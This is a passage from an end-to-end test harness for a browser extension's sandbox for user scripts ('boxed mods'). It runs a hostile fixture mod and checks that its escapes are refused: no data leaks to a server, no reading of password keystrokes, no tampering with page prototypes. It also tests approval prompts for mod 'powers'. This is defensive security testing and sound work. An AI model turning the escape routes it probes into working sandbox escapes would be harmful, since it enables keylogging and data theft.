      return `colour ${before.color}, link hidden, "${before.target}", Host items hidden (later too: "${later.text}"); the url() one refused, nothing loaded`;
    } finally {
      for (const f of [good, bad]) { try { fs.unlinkSync(f); } catch { /* gone */ } }
      await this.cli(['enable', '127.0.0.1/e2e-banner', '--url', site]).catch(() => {});
    }
  }

  // ---- sandboxed mods (extension/sandbox.js; docs/SAFE-MODS.md "Sandboxed: what's built")

  /** The sandboxed mods' files for the test page (tests/e2e/fixtures, examples/boxed), by id. */
  sandboxFiles() {
    const fx = (f) => fs.readFileSync(path.join(I.REPO, 'tests', 'e2e', 'fixtures', f), 'utf8');
    const sample = (rel) => fs.readFileSync(path.join(I.REPO, 'examples', 'boxed', rel), 'utf8').replace(/^\/\/ @match .*$/m, '// @match       *://127.0.0.1/sandbox.html*');
    const main = `// ==WebMod==\n// @name E2E sandbox timing, page world\n// @match *://127.0.0.1/sandbox.html*\n// @run-at document-idle\n// ==/WebMod==\n(() => {
  const cells = document.querySelectorAll('.cell');
  const t0 = performance.now(); for (const c of cells) c.style.setProperty('background-color', 'rgb(9, 9, 9)', 'important');
  document.documentElement.setAttribute('data-trif-box-sbx-main-ms', String(performance.now() - t0));
})();\n`;
    return {
      'e2e-sbx-hostile': fx('sandbox-hostile.js'), 'e2e-sbx-good': fx('sandbox-good.js'), 'e2e-sbx-throws': fx('sandbox-throws.js'), 'e2e-sbx-main': main,
      'e2e-sbx-shopping': sample('amazon.com/simple-shopping.js'), 'e2e-sbx-dvd': sample('www.google.com/dvd-logo.js'),
    };
  }

  async sandboxedCheck(win) {
    const site = '127.0.0.1';
    const base = `http://${site}:${this.o.servers.port}`;
    const dir = path.join(this.trif, 'sites', site);
    const files = this.sandboxFiles();
    const ids = Object.keys(files);
    const boxed = ids.filter((id) => id !== 'e2e-sbx-main');
    this.sandboxPage = true;
    try {
      for (const [id, text] of Object.entries(files)) fs.writeFileSync(path.join(dir, `${id}.js`), text);
      // (never held for their code, whoever wrote them: the helper's holds are empty for them)
      const st = await waitFor('the sandboxed mods in the extension', async () => {
        const x = await this.cli(['status'], { timeoutMs: 20000 });
        return ids.every((id) => new RegExp(`${id}\\s+(registered|WAITING)`).test(x.stdout)) ? x.stdout : null;
      }, { timeoutMs: 25000, intervalMs: 500 });
      const ext = (await this.cli(['status'], { json: true, timeoutMs: 20000 })).json;
      const heldByHelper = boxed.filter((id) => (ext.held || {})[`${site}/${id}`]);
      if (heldByHelper.length) throw new Error(`held by the helper: ${heldByHelper.join(', ')}`);
      if (ext.extension.sandbox === false) return await this.sandboxFallbackCheck(win, files, st);
      for (const id of boxed) if (!new RegExp(`${id}\\s+registered \\(boxed\\)`).test(st)) throw new Error(`trif status: ${st.split('\n').find((l) => l.includes(id))}`);
      const tabsBefore = await this.ext(`async () => (await chrome.tabs.query({})).length`);
      await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url, active: true }); }`, [win.tabId, `${base}/sandbox.html`]);
      const readPage = async () => JSON.parse((await this.cli(['run', '--tab', String(win.tabId), `(() => {
        const d = document.documentElement, q = (s) => document.querySelector(s);
        const px = (() => { try { const c = q('#trif-box-sbx-canvas'); return c ? [...c.getContext('2d').getImageData(1, 1, 1, 1).data].join(',') : null; } catch (e) { return 'unreadable: ' + e.message; } })();
        return {
          url: location.href,
          hostile: d.getAttribute('data-trif-box-sbx-hostile'), good: d.getAttribute('data-trif-box-sbx-good'),
          timer: d.getAttribute('data-trif-box-sbx-timer'), interval: d.getAttribute('data-trif-box-sbx-interval'), frame: d.getAttribute('data-trif-box-sbx-frame'),
          visits: d.getAttribute('data-trif-box-sbx-visits'), clicked: d.getAttribute('data-trif-box-sbx-clicked'), mainMs: d.getAttribute('data-trif-box-sbx-main-ms'),
          titleColor: getComputedStyle(q('#title')).color, hiddenShown: q('.sbx-hide').getClientRects().length > 0,
          made: q('#trif-box-sbx-made')?.textContent || null, txt: q('#txt').textContent, later: q('.later') ? [q('.later').textContent, q('.later').getAttribute('data-trif-box-seen')] : null,
          canvas: px, copy: q('#trif-box-sbx-copy') ? q('#trif-box-sbx-copy').getAttribute('src') : null, cellColor: getComputedStyle(q('.cell')).color,
          shown: Object.fromEntries(['r1', 'r-ad', 'r-carousel', 'r2'].map((id) => [id, document.getElementById(id).getClientRects().length > 0])),
          carouselMarked: q('#r-carousel').hasAttribute('data-trif-box-hide'), dvd: q('[data-trif-box-dvd]')?.style.transform || null,
          logoHidden: getComputedStyle(q('#logo')).visibility === 'hidden',
          hits: window.__hits.slice(), secret: window.__pageSecret, protosClean: Array.prototype.__trifEscape === undefined && ({}).__trifEscape === undefined, pageFrozen: Object.isFrozen(Array.prototype),
          form: [q('#fi').value, q('#fi').getAttribute('value'), q('#ta').value, q('#opt').textContent],
          gadget: q('#gadget')?.textContent ?? null, pstyle: q('#pstyle').textContent, plink: [q('#plink').getAttribute('href'), q('#plink').getAttribute('target')],
          pimg: q('#pimg').getAttribute('src'), btnClick: q('#pbtn').getAttribute('onclick'), frmSrcdoc: q('#frm').getAttribute('srcdoc'), bodyBg: getComputedStyle(document.body).backgroundImage,
          storage: Object.keys(localStorage), windowNames: Object.getOwnPropertyNames(window),
          keys: d.getAttribute('data-trif-box-sbx-keys'), own: q('#trif-box-sbx-own') ? [q('#trif-box-sbx-own').type, q('#trif-box-sbx-own').className, q('#trif-box-sbx-own').dataset.trifBoxKind, !!q('#trif-box-sbx-own').form] : null,
          editor: q('#editor').textContent, editorOutline: getComputedStyle(q('#editor')).outlineColor, link: q('#trif-box-sbx-link')?.getAttribute('href') || null,
          det: q('#det').open, dlg: q('#dlg').open, opts: [q('#opt')?.parentElement?.id, q('#opt2')?.parentElement?.id], xf: q('#xf')?.parentElement?.id || null, rvClass: q('#rv').className,
          pcv: (() => { try { return [...q('#pcv').getContext('2d').getImageData(1, 1, 1, 1).data].join(','); } catch (e) { return 'unreadable'; } })(),
          fh: q('#fh') && q('#fh').form ? q('#fh').form.id : null,
          gadgetSrc: [q('#gadget-src').className, q('#gadget-src').getAttribute('data-auto-post')], pw: [q('#pw').form ? q('#pw').form.id : null, q('#fi').form ? q('#fi').form.id : null, q('#fb').form ? q('#fb').form.id : null],
        };
      })()`], { timeoutMs: 20000 })).stdout);
      let last = null;
      const first = await waitFor('the sandboxed mods\' results', async () => {
        const o = last = await readPage();
        return o.hostile && o.good && o.timer && o.interval && o.frame && o.visits && o.mainMs && o.dvd && o.later && o.later[1] ? o : null;
      }, { timeoutMs: 20000, intervalMs: 500 }).catch((e) => {
        const { hostile: h, windowNames: _w, good: g, ...rest } = last || {};
        throw new Error(`${e.message}: ${JSON.stringify(rest).slice(0, 2500)} (hostile ${h ? 'done' : 'not done'}, good ${g ? 'done' : 'not done'})`);
      });
      // a click the page gets (from the page's own world): the mod's listener hears it, as a stand-in
      await this.cli(['run', '--tab', String(win.tabId), `document.getElementById('target-click').click()`], { timeoutMs: 20000 });
      // real keys (the browser's input, not script): two into the password field, one on the page itself
      const sbxCtx = await this.d.findPage((u) => u.includes('/sandbox.html'), { timeoutMs: 5000 });
      await this.d.click(sbxCtx, '#pw');
      for (const k of ['h', 'i']) await this.d.key(sbxCtx, k);
      // (and one into a password field inside a closed shadow root on a plain <div>: red-team round 2, RT-8)
      await this.d.click(sbxCtx, '#shost');
      await this.d.key(sbxCtx, 'x');
      await this.d.click(sbxCtx, '#title');
      await this.d.key(sbxCtx, 'q');
      await sleep(1500); // (anything late: loads, timers)
      const later = await readPage();
      const tabsAfter = await this.ext(`async () => (await chrome.tabs.query({})).length`);
      const leaks = this.o.servers.requests.filter((q) => q.url.includes('e2e-sbx-leak')).map((q) => `${q.host}${q.url}`);
      // (the page's htmx-like code does send when the page itself plants its attribute: so "nothing" above means
      // the mods couldn't, not that the gadget is broken)
      await this.cli(['run', '--tab', String(win.tabId), `(() => { const d = document.createElement('div'); d.setAttribute('data-auto-post', '/e2e-sbx-gadget-control'); document.body.append(d); return 1; })()`], { timeoutMs: 20000 });
      const gadgetWorks = await waitFor('the page\'s own gadget to send', async () => this.o.servers.requests.some((q) => q.url.startsWith('/e2e-sbx-gadget-control')) || null, { timeoutMs: 5000, intervalMs: 200 }).catch(() => false);
      // ---- the hostile mod: escape by escape
      const hostile = JSON.parse(first.hostile);
      const escaped = Object.entries(hostile).filter(([, v]) => !/^(refused|absent)/.test(v));
      // (the test's own input: the click from the page's world, and the real clicks and keys above)
      const pageNoticed = later.hits.filter((h) => !/^(click|focus|keydown|input):(pw|title|target-click|shost|)$/.test(h));
      const pageSide = {
        'the page noticed nothing (clicks, keys, submits, messages, inline code)': pageNoticed.length === 0 ? 'nothing' : pageNoticed,
        'the page\'s prototypes untouched (and not frozen: lockdown stayed in TRIF\'s world)': later.protosClean && !later.pageFrozen,
        'the form as it was': JSON.stringify(later.form) === JSON.stringify(['v', 'v', 't', 'o']),
        'the page\'s empty script still empty': later.gadget === '',
        'the page\'s style element as it was': later.pstyle === '#title { letter-spacing: 0 }',
        'the page\'s link as it was': JSON.stringify(later.plink) === JSON.stringify(['/two.html', null]),
        'the page\'s image as it was': later.pimg === '/favicon.ico',
        'no handler, no srcdoc, no background from elsewhere': later.btnClick === "__hits.push('onclick')" && later.frmSrcdoc === null && later.bodyBg === 'none',
        'the tab stayed on the page, no new tab': later.url === `${base}/sandbox.html` && tabsAfter === tabsBefore,
        'the test server saw nothing': leaks.length === 0 ? 'nothing' : leaks,
        'the page\'s own global unchanged': later.secret === 'from the page',
        'the page\'s htmx-like code works (it sent what the page itself planted)': gadgetWorks === true,
        'the page\'s gadget element as it was': JSON.stringify(later.gadgetSrc) === JSON.stringify(['js-src done', '/e2e-sbx-leak-clone']),
        'the page\'s fields in the forms they were in': JSON.stringify(later.pw) === JSON.stringify([null, 'f', 'f']),
        'keys typed into the password field, and into one in a closed shadow root, unseen by the mod': /^null@input,null@input,null@div,q@/.test(later.keys || '') ? true : later.keys,
        'the page\'s editor and its hidden field as they were': later.editor === 'secret drafta link in the draft' && later.fh === 'f',
        'the page\'s options and custom field where they were (audit AU-4, AU-5)': JSON.stringify(later.opts) === JSON.stringify(['sel', 'sel2']) && later.xf === 'f',
        'the page\'s canvas undrawn, its dialog closed (audit AU-6, AU-8)': later.pcv === '0,0,0,0' && later.dlg === false,
      };
      const pageFailed = Object.entries(pageSide).filter(([, v]) => v !== true && v !== 'nothing');
      // ---- the good one
      const good = JSON.parse(first.good);
      const bare = new Set(Object.getOwnPropertyNames(require('vm').runInNewContext('globalThis')));
      const beyond = good.names.filter((n) => !bare.has(n));
      const browserOnly = new Set(first.windowNames.filter((n) => !bare.has(n)));
      // (beyond the language: TRIF's API, named like the browser's timers, and what SES passes through as plain
      // data tools: Temporal, TextEncoder, TextDecoder)
      const API = new Set(['eval', 'Function', 'Compartment', 'lockdown', 'harden', 'assert', 'page', 'trif', 'console', 'setTimeout', 'clearTimeout', 'setInterval', 'clearInterval', 'requestAnimationFrame', 'cancelAnimationFrame', 'Math', 'Date', 'Temporal', 'TextEncoder', 'TextDecoder']);
      const reachable = good.names.filter((n) => browserOnly.has(n) && !API.has(n));
      const want = {
        'restyle (trif.css)': first.titleColor === 'rgb(1, 2, 3)', 'hide (trif.hide)': !first.hiddenShown, 'add an element': first.made === 'made in the sandbox',
        'text (trif.text), also later': first.txt === 'the robot says hi' && first.later[0] === 'later: the robot again', 'observe (trif.observe), later': first.later[1] === 'yes',
        'canvas': first.canvas === '7,8,9,255', 'timers': first.timer === 'ran' && first.interval === '3', 'frames': first.frame === 'number',
        'a copy of an image the page shows': first.copy === '/favicon.ico', 'style() on 1000 cells': first.cellColor === 'rgb(1, 2, 3)' && good.cells === 1000,
        'listening (a stand-in as the target)': later.clicked === 'click:target-click:stand-in', 'settings, first visit': first.visits === '0',
        'no browser names on its global': reachable.length === 0,
        'its own button (type button, not in a form), trif- class and data': JSON.stringify(later.own) === JSON.stringify(['button', 'trif-box-own', 'own', false]),
        'a copy of a link the page has, the page\'s <details> opened, its editor restyled': later.link === '/two.html' && later.det === true && later.editorOutline === 'rgb(1, 2, 3)',
        'a hotkey on the page reaches it': /q@(body|html|h1)$/.test(later.keys || ''),
      };
      const missing = Object.entries(want).filter(([, v]) => !v).map(([k]) => k);
      // settings kept by TRIF, not the site: the next load sees the saved value, the page's storage has nothing
      await this.cli(['reload', '--tab', String(win.tabId)], { timeoutMs: 30000 });
      const again = await waitFor('the second visit', async () => { const o = await readPage(); return o.visits ? o : null; }, { timeoutMs: 15000, intervalMs: 400 });
      if (again.visits !== '1') missing.push(`settings on the second visit: ${again.visits}`);
      if (again.storage.length) missing.push(`the page's localStorage has ${again.storage.join(', ')}`);
      // (kept by the extension, by mod and by the site the browser said the page was on)
      const kept = await this.ext(`async () => (await chrome.storage.local.get('sandboxSettings')).sandboxSettings || null`);
      if (JSON.stringify(kept) !== JSON.stringify({ '127.0.0.1/e2e-sbx-good': { '127.0.0.1': { prefs: '{"visits":2}' } } })) missing.push(`the extension's sandboxSettings: ${JSON.stringify(kept)}`);
      // errors and logs, as for page mods
      const errs = (await this.cli(['errors', '--tab', String(win.tabId)], { json: true, timeoutMs: 20000 })).json;
      const errList = Array.isArray(errs) ? errs : (errs && (errs.errors || errs.result)) || [];
      const errText = JSON.stringify(errList);
      if (!/127\.0\.0\.1\/e2e-sbx-throws/.test(errText) || !/thrown at the top of a sandboxed mod/.test(errText)) missing.push(`trif errors: the top-level throw (${errText.slice(0, 300)})`);
      if (!/thrown later by the sandboxed mod/.test(errText)) missing.push('trif errors: the throw from a timer');
      // (with SES's safe error taming, the stack is TRIF's to read, and its line numbers are the file's)
      if (!/e2e-sbx-throws\.js:6\b/.test(errText)) missing.push(`trif errors: the line of the throw (e2e-sbx-throws.js:6) in ${errText.slice(0, 400)}`);
      const logs = (await this.cli(['logs', '--tab', String(win.tabId)], { timeoutMs: 20000 })).stdout;
      if (!/hello from the sandbox/.test(logs) || !/a warning from the sandbox/.test(logs)) missing.push(`trif logs: ${logs.slice(0, 300)}`);
      // trif check: the lint for the hostile one (not a failure)
      const check = await this.cli(['check', path.join(dir, 'e2e-sbx-hostile.js')], { timeoutMs: 20000 });
      if (check.status !== 0 || !/never waits/.test(check.stdout) || !/- document: not there/.test(check.stdout) || !/- \.click\(\): needs the click power/.test(check.stdout)) missing.push(`trif check: ${check.stdout.slice(0, 400)}`);
      // timing (TRIF's own numbers, from the sandbox world) against a page mod doing the same
      const readStats = async () => JSON.parse(await this.ext(`async (tabId, world) => {
        const r = await chrome.userScripts.execute({ target: { tabId }, world: 'USER_SCRIPT', worldId: world, injectImmediately: true, js: [{ code: 'JSON.stringify(globalThis.__trifSandbox && globalThis.__trifSandbox.stats)' }] });
        return r[0].result;
      }`, [win.tabId, 'trif-sandbox']) || 'null');
      const stats = await readStats();
      // per frame: the DVD port's requestAnimationFrame callbacks over two seconds (the page otherwise idle)
      if (stats) {
        await sleep(2000);
        const s2 = await readStats();
        if (s2) stats.idle2s = { callbacks: s2.callbacks - stats.callbacks, ms: s2.callbackMs - stats.callbackMs, perCallbackMs: (s2.callbackMs - stats.callbackMs) / Math.max(1, s2.callbacks - stats.callbacks) };
      }
      const samples = { simpleShopping: { shown: first.shown, carouselMarked: first.carouselMarked }, dvd: { moved: first.dvd !== later.dvd, logoHidden: first.logoHidden } };
      const samplesOk = first.shown.r1 && first.shown.r2 && !first.shown['r-ad'] && !first.shown['r-carousel'] && first.carouselMarked && samples.dvd.moved && first.logoHidden;
      if (!samplesOk) missing.push(`the samples: ${JSON.stringify(samples)}`);
      const res = {
        browser: this.o.browser, hostile, escaped, pageSide, good: want, missing,
        compartmentGlobal: { count: good.names.length, beyondTheLanguage: beyond, browserNamesReachable: reachable },
        pageWorldGlobal: { count: first.windowNames.length, browserOnlyNames: browserOnly.size },
        timing: { styled1000: { sandboxedMs: good.ms, pageWorldMs: Number(first.mainMs) }, stats }, samples,
      };
      fs.writeFileSync(this.r.file(`sandbox-${this.o.browser}.json`), JSON.stringify(res, null, 2));
      await this.shot(this.pageCtx, 'sandbox-page');
      const problems = [...escaped.map(([k, v]) => `ESCAPE ${k}: ${v}`), ...pageFailed.map(([k, v]) => `PAGE ${k}: ${JSON.stringify(v)}`), ...missing.map((m) => `MISSING ${m}`)];
      if (problems.length) throw new Error(problems.join('\n'));
      const st2 = stats || {};
      return `${Object.keys(hostile).length} escapes tried, all refused or absent; server saw nothing; page noticed nothing; ${Object.keys(want).length} good things work; `
        + `${good.names.length} names on the global (${beyond.join(', ')} beyond the language); 1000 cells ${good.ms} ms sandboxed vs ${Number(first.mainMs).toFixed(1)} ms page; `
        + `SES load ${st2.sesMs?.toFixed?.(1)} ms, lockdown ${st2.lockdownMs?.toFixed?.(1)} ms, mods' first runs ${Object.values(st2.mods || {}).map((m) => m.runMs.toFixed(1)).join('/')} ms, ${st2.callbacks} callbacks ${st2.callbackMs?.toFixed?.(1)} ms`
        + (st2.idle2s ? `; then 2 s of the DVD port: ${st2.idle2s.callbacks} frames, ${st2.idle2s.perCallbackMs.toFixed(3)} ms each` : '');
    } finally {
      for (const id of ids) { try { fs.unlinkSync(path.join(dir, `${id}.js`)); } catch { /* gone */ } }
    }
  }

  /**
   * A browser without TRIF's sandbox world: each sandboxed mod waits for the user's OK (held in the
   * extension, with the reason), never runs unsandboxed by itself; Allow in the panel runs it as a page
   * script with the same API.
   */
  async sandboxFallbackCheck(win, files, status) {
    const site = '127.0.0.1';
    const base = `http://${site}:${this.o.servers.port}`;
    const boxed = Object.keys(files).filter((id) => id !== 'e2e-sbx-main');
    for (const id of boxed) if (!new RegExp(`${id}\\s+WAITING: ${this.d.name} can't run boxed mods`).test(status)) throw new Error(`trif status: ${status.split('\n').find((l) => l.includes(id))}`);
    await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url, active: true }); }`, [win.tabId, `${base}/sandbox.html`]);
    await sleep(1500);
    const ran = async () => JSON.parse((await this.cli(['run', '--tab', String(win.tabId), `({ good: document.documentElement.getAttribute('data-trif-box-sbx-good'), hostile: document.documentElement.getAttribute('data-trif-box-sbx-hostile'), main: document.documentElement.getAttribute('data-trif-box-sbx-main-ms') })`], { timeoutMs: 20000 })).stdout);
    const before = await ran();
    if (before.good || before.hostile) throw new Error(`a sandboxed mod ran unsandboxed without the user's OK: ${JSON.stringify(before)}`);
    if (!before.main) throw new Error('the page mod didn\'t run');
    const row = await waitFor('the panel to show the good one on hold', () => this.panel(`async () => {
      const li = document.querySelector('li[data-mod="127.0.0.1/e2e-sbx-good"]');
      return li && li.classList.contains('held') ? { group: li.dataset.group } : null;
    }`), { timeoutMs: 15000 });
    const card = await this.approvalFor('127.0.0.1/e2e-sbx-good');
    if (row.group !== 'page' || !card.items.some((f) => /can't run boxed mods, so here it would run as a free mod/.test(f)) || card.chip !== 'Boxed mod'
      || card.note !== 'Allow runs this version as a free mod, in this browser only.') throw new Error(`the panel: ${JSON.stringify({ row, card })}`);
    await this.shot(this.panelCtx, 'panel-sandbox-fallback-held');
    await this.d.click(this.panelCtx, '#approval .ap-allow');
    const after = await waitFor('the allowed one running as a page script', async () => { const o = await ran(); return o.good ? o : null; }, { timeoutMs: 20000, intervalMs: 500 });
    const st = (await this.cli(['status'], { timeoutMs: 20000 })).stdout;
    if (!/e2e-sbx-good\s+registered \(boxed mod, run as a free mod/.test(st)) throw new Error(`trif status after Allow: ${st.split('\n').find((l) => l.includes('e2e-sbx-good'))}`);
    if (!/e2e-sbx-hostile\s+WAITING/.test(st)) throw new Error('the hostile one stopped waiting');
    return { status: 'pass', detail: `${this.d.name} has no sandbox: ${boxed.length} sandboxed mods waited (status WAITING, panel on hold under Page scripts, with the reason); Allow ran the good one as a page script (${JSON.parse(after.good).names.length} names), the others still wait` };
  }

  async sandboxPageFormCheck(win) {
    const base = `http://127.0.0.1:${this.o.servers.port}`;
    const source = fs.readFileSync(path.join(I.REPO, 'tests', 'e2e', 'fixtures', 'sandbox-good.js'), 'utf8')
      .replace("const out = { names: Object.getOwnPropertyNames(globalThis).sort() };", 'const out = { names: [] };');
    this.sandboxPage = true;
    await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url, active: true }); }`, [win.tabId, `${base}/sandbox.html?page-form`]);
    await waitFor('the test page', async () => /complete/.test((await this.cli(['run', '--tab', String(win.tabId), 'document.readyState'], { timeoutMs: 20000 })).stdout) || null, { timeoutMs: 15000, intervalMs: 300 });
    // (as lib.js registers an allowed one: sandbox.js sandboxPageCode, in the page's world)
    await this.ext(`async (tabId, source) => {
      const m = await import(chrome.runtime.getURL('sandbox.js'));
      await chrome.userScripts.execute({ target: { tabId }, world: 'MAIN', injectImmediately: true, js: [{ code: m.sandboxPageCode('127.0.0.1/e2e-sbx-page-form', source) }] });
    }`, [win.tabId, source]);
    const read = async () => JSON.parse((await this.cli(['run', '--tab', String(win.tabId), `(() => { const d = document.documentElement, q = (s) => document.querySelector(s); return {
      good: !!d.getAttribute('data-trif-box-sbx-good'), timer: d.getAttribute('data-trif-box-sbx-timer'), interval: d.getAttribute('data-trif-box-sbx-interval'), frame: d.getAttribute('data-trif-box-sbx-frame'),
      visits: d.getAttribute('data-trif-box-sbx-visits'), titleColor: getComputedStyle(q('#title')).color, hidden: q('.sbx-hide').getClientRects().length === 0,
      made: q('#trif-box-sbx-made')?.textContent || null, txt: q('#txt').textContent, seen: q('.later')?.getAttribute('data-trif-box-seen') || null, copy: q('#trif-box-sbx-copy')?.getAttribute('src') || null,
      storage: Object.keys(localStorage) }; })()`], { timeoutMs: 20000 })).stdout);
    let last = null;
    const o = await waitFor('the page-script form\'s results', async () => { const x = last = await read(); return x.good && x.timer && x.interval && x.frame && x.visits && x.seen ? x : null; }, { timeoutMs: 15000, intervalMs: 400 })
      .catch((e) => { throw new Error(`${e.message}: ${JSON.stringify(last)}`); });
    const bad = Object.entries({ titleColor: o.titleColor === 'rgb(1, 2, 3)', hidden: o.hidden, made: o.made === 'made in the sandbox', txt: o.txt === 'the robot says hi',
      copy: o.copy === '/favicon.ico', interval: o.interval === '3', frame: o.frame === 'number', visits: o.visits === '0',
      storage: o.storage.includes('trif.settings.127.0.0.1/e2e-sbx-page-form.prefs') }).filter(([, v]) => !v).map(([k]) => k);
    if (bad.length) throw new Error(`${bad.join(', ')}: ${JSON.stringify(o)}`);
    // (its settings, in the page's storage as a page script, cleaned up)
    await this.cli(['run', '--tab', String(win.tabId), `localStorage.clear()`], { timeoutMs: 20000 });
    return 'restyle, hide, add, text, observe (later), timers, frames, image copy, settings (in the page\'s storage, as a page script): all work in the page\'s world';
  }

  async powersCheck(win) {
    const site = '127.0.0.1';
    const base = `http://${site}:${this.o.servers.port}`;
    const dir = path.join(this.trif, 'sites', site);
    const fx = (f) => fs.readFileSync(path.join(I.REPO, 'tests', 'e2e', 'fixtures', f), 'utf8');
    // (a tiny sound: 80 samples of 8-bit mono PCM, as a data: URL)
    const pcm = Buffer.alloc(80, 128);
    const hdr = Buffer.alloc(44);
    hdr.write('RIFF', 0); hdr.writeUInt32LE(36 + pcm.length, 4); hdr.write('WAVEfmt ', 8); hdr.writeUInt32LE(16, 16); hdr.writeUInt16LE(1, 20); hdr.writeUInt16LE(1, 22);
    hdr.writeUInt32LE(8000, 24); hdr.writeUInt32LE(8000, 28); hdr.writeUInt16LE(1, 32); hdr.writeUInt16LE(8, 34); hdr.write('data', 36); hdr.writeUInt32LE(pcm.length, 40);
    const wav = `data:audio/wav;base64,${Buffer.concat([hdr, pcm]).toString('base64')}`;
    const allFile = path.join(dir, 'e2e-pw-all.js'), noneFile = path.join(dir, 'e2e-pw-none.js');
    const all = fx('powers-all.js').replace('__WAV__', wav);
    const status = async () => (await this.cli(['status'], { timeoutMs: 20000 })).stdout;
    const line = (st, id) => st.split('\n').find((l) => l.includes(id)) || '';
    const read = async () => JSON.parse((await this.cli(['run', '--tab', String(win.tabId), `(() => { const d = document.documentElement; return {
      all: d.getAttribute('data-trif-box-pw-all'), none: d.getAttribute('data-trif-box-pw-none'), keys: d.getAttribute('data-trif-box-pw-keys'), typed: d.getAttribute('data-trif-box-pw-typed'),
      box: document.getElementById('trif-box-pw-box') ? document.getElementById('trif-box-pw-box').innerHTML.length : 0, formInputs: document.querySelectorAll('#f input').length }; })()`], { timeoutMs: 20000 })).stdout);
    const typeKeys = async () => {
      const ctx = await this.d.findPage((u) => u.includes('/sandbox.html'), { timeoutMs: 5000 });
      // (each key once the focus is where it should be: a click can land while the page is still settling)
      const focused = async () => (await this.cli(['run', '--tab', String(win.tabId), `(document.activeElement && document.activeElement.id) || document.activeElement.localName`], { timeoutMs: 20000 })).stdout.trim().replace(/"/g, '');
      for (const [sel, k, want] of [['#pw', 'h', 'pw'], ['#fi', 'k', 'fi'], ['#shost', 'x', 'shost'], ['#title', 'q', 'body']]) {
        for (let i = 0; i < 3; i++) { await this.d.click(ctx, sel); if (await focused() === want) break; await sleep(300); }
        await this.d.key(ctx, k);
      }
      await sleep(500);
    };
    const problems = [];
    this.sandboxPage = true;
    try {
      fs.writeFileSync(noneFile, fx('powers-none.js'));
      fs.writeFileSync(allFile, all);
      // held, for its set of powers, with what it asks for
      const held = await waitFor('the mod with powers held', async () => { const st = await status(); return /e2e-pw-all\s+HELD/.test(st) && /e2e-pw-none\s+registered \(boxed\)/.test(st) ? st : null; }, { timeoutMs: 25000, intervalMs: 500 });
      const heldLine = line(held, 'e2e-pw-all');
      if (!heldLine.includes('HELD: it can read what you type on this site, but can\'t send it anywhere; it can play sounds; it can add its own controls (sliders, pickers)')) problems.push(`trif status: ${heldLine}`);
      await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url, active: true }); }`, [win.tabId, `${base}/sandbox.html`]);
      // the approval dialog: opened by itself for the new hold (the one waiting, or one of them)
      const rowInfo = await waitFor('the panel\'s hold', () => this.panel(`async () => {
        const li = document.querySelector('li[data-mod="127.0.0.1/e2e-pw-all"]');
        return li && li.classList.contains('held') ? { tag: li.querySelector('.tag.on-hold')?.textContent, powers: li.querySelector('.mod-powers')?.textContent, group: li.dataset.group } : null;
      }`), { timeoutMs: 15000 });
      const opened = await waitFor('the approval dialog, by itself', () => this.approvalState(), { timeoutMs: 10000 }).catch(() => null);
      if (!opened) problems.push('the approval dialog didn\'t open by itself for a new hold');
      else if (!opened.focusIn) problems.push(`the focus isn't in the approval dialog: ${JSON.stringify(opened)}`);
      const row = await this.approvalFor('127.0.0.1/e2e-pw-all');
      const want = {
        name: 'E2E Boxed mod with powers', chip: 'Boxed mod', where: '127.0.0.1 · e2e-pw-all.js', lead: 'It asks for these powers. TRIF holds it to them:',
        items: ['It can read what you type on this site, but can\'t send it anywhere.', 'It can play sounds.', 'It can add its own controls (sliders, pickers).'],
        together: ['Together, it could turn what it reads into sounds that a device nearby could pick up.'],
        note: 'It\'s new or changed since TRIF last let it run. Updates that ask for the same powers won\'t ask again.', show: 'Show code',
      };
      for (const [k, v] of Object.entries(want)) if (JSON.stringify(row[k]) !== JSON.stringify(v)) problems.push(`the approval dialog's ${k}: ${JSON.stringify(row[k])}`);
      if (rowInfo.tag !== 'on hold' || rowInfo.powers !== 'Powers: read-drafts, sound, controls' || rowInfo.group !== 'sandboxed') problems.push(`the held row: ${JSON.stringify(rowInfo)}`);
      // the screenshots, in both themes (Chrome; Firefox's driver can't set the colour scheme)
      for (const scheme of ['dark', 'light']) if (await this.d.colorScheme(this.panelCtx, scheme)) { await sleep(150); await this.shot(this.panelCtx, `approval-powers-${scheme}`); }
      await this.d.colorScheme(this.panelCtx, '');
      // the file name in the card opens the code card over it; Esc closes that one only
      await this.d.click(this.panelCtx, '#approval .ap-where .file-link');
      const over = await waitFor('the code card over the approval', () => this.panel(`async () => { const c = document.getElementById('code-view'); return c && c.open ? { mod: c.dataset.mod, approval: document.getElementById('approval').open } : null; }`), { timeoutMs: 8000 }).catch(() => null);
      if (!over || over.mod !== '127.0.0.1/e2e-pw-all' || !over.approval) problems.push(`the file name in the approval card: ${JSON.stringify(over)}`);
      await this.d.key(this.panelCtx, 'Escape');
      if (!(await this.approvalState())) problems.push('Esc on the code card closed the approval dialog too');
      // Show code opens the code in the card
      await this.d.click(this.panelCtx, '#approval .ap-show');
      const code = await waitFor('the code in the card', () => this.panel(`async () => { const c = document.querySelector('#approval .ap-code'); return c && !c.hidden && c.textContent.includes('E2E Boxed mod with powers') ? true : null; }`), { timeoutMs: 8000 }).catch(() => null);
      if (!code) problems.push('Show code didn\'t show the code in the card');
      // the keyboard: Tab stays in the card; Esc is Not now: closed, the row still on hold, the badge up
      for (let i = 0; i < 6; i++) await this.d.key(this.panelCtx, 'Tab');
      const tabbed = await this.approvalState();
      if (!tabbed || !tabbed.focusIn) problems.push(`Tab left the approval dialog: ${JSON.stringify(tabbed)}`);
      for (let i = 0; i < 5 && await this.approvalState(); i++) await this.d.key(this.panelCtx, 'Escape');
      const after = await this.panel(`async () => ({ open: !!document.getElementById('approval')?.open, badge: document.getElementById('waiting-badge').hidden ? '' : document.getElementById('waiting-badge').textContent,
        tag: document.querySelector('li[data-mod="127.0.0.1/e2e-pw-all"] .tag.on-hold')?.textContent })`);
      if (after.open || !/^\d+ waiting$/.test(after.badge) || after.tag !== 'on hold') problems.push(`after Esc: ${JSON.stringify(after)}`);
      // (not again by itself: a status refresh later, still closed)
      await sleep(2500);
      if (await this.approvalState()) problems.push('the approval dialog opened again by itself after Not now');
      // the badge reopens it; Allow
      await this.d.click(this.panelCtx, '#waiting-badge');
      if (!await waitFor('the dialog again', () => this.approvalState(), { timeoutMs: 8000 }).catch(() => null)) problems.push('the badge didn\'t reopen the approval dialog');
      await this.approvalFor('127.0.0.1/e2e-pw-all');
      await this.d.click(this.panelCtx, '#approval .ap-allow');
